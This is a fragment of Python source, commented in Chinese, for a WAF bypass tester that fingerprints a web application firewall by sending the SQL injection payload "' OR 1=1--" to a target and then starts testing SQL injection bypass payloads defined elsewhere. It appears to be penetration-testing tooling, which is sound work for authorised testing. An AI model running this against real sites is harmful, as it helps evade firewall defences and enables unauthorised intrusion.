class WAFBypasser:
    """WAF 绕过测试器核心类"""

    def __init__(self, config: TestConfig):
        self.config = config
        self.session = requests.Session()
        self.waf_info = WAFInfo()
        self.results: List[BypassResult] = []
        self._setup_session()

    def _setup_session(self):
        """配置 HTTP 会话"""
        self.session.verify = self.config.verify_ssl
        self.session.headers.update({"User-Agent": self.config.user_agent})
        if self.config.cookie:
            self.session.headers.update({"Cookie": self.config.cookie})
        if self.config.headers:
            self.session.headers.update(self.config.headers)
        if self.config.proxy:
            self.session.proxies = {"http": self.config.proxy, "https": self.config.proxy}

    def detect_waf(self) -> WAFInfo:
        """检测 WAF 指纹"""
        logging.info("[*] 检测 WAF...")

        # 发送正常请求
        normal_resp = self._send_request("test_value")
        if normal_resp is None:
            logging.error("[!] 无法连接目标")
            return self.waf_info

        # 发送攻击 payload 触发 WAF
        attack_resp = self._send_request("' OR 1=1--")
        if attack_resp is None:
            return self.waf_info

        # 分析响应头
        headers_str = " ".join([f"{k}: {v}" for k, v in attack_resp.headers.items()]).lower()
        cookies_str = " ".join([f"{k}={v}" for k, v in attack_resp.cookies.items()]).lower()
        body_lower = attack_resp.text.lower()

        for vendor, fingerprint in WAF_FINGERPRINTS.items():
            matches = 0
            total_checks = 0

            # 检查响应头
            for sig in fingerprint["headers"]:
                total_checks += 1
                if sig.lower() in headers_str:
                    matches += 1
                    self.waf_info.signatures.append(f"Header: {sig}")

            # 检查 Cookie
            for sig in fingerprint["cookies"]:
                total_checks += 1
                if sig.lower() in cookies_str:
                    matches += 1
                    self.waf_info.signatures.append(f"Cookie: {sig}")

            # 检查状态码
            if attack_resp.status_code in fingerprint["block_codes"]:
                matches += 1
                self.waf_info.block_status_codes.append(attack_resp.status_code)

            # 检查响应体
            for sig in fingerprint["block_body"]:
                total_checks += 1
                if sig.lower() in body_lower:
                    matches += 1
                    self.waf_info.signatures.append(f"Body: {sig}")

            # 计算置信度
            if total_checks > 0:
                confidence = matches / total_checks
                if confidence > 0.3:  # 阈值
                    self.waf_info.detected = True
                    self.waf_info.vendor = vendor
                    self.waf_info.confidence = confidence
                    break

        if self.waf_info.detected:
            logging.info(f"[+] WAF 检测: {self.waf_info.vendor.value} (置信度: {self.waf_info.confidence:.1%})")
            for sig in self.waf_info.signatures[:5]:
                logging.info(f"    特征: {sig}")
        else:
            logging.info("[-] 未检测到 WAF 或 WAF 未拦截")

        return self.waf_info

    def test_sqli_bypass(self) -> List[BypassResult]:
        """测试 SQL 注入绕过"""
        logging.info("[*] 测试 SQL 注入绕过...")
        return self._test_bypass_payloads(SQLI_BYPASS_PAYLOADS, "SQLi")

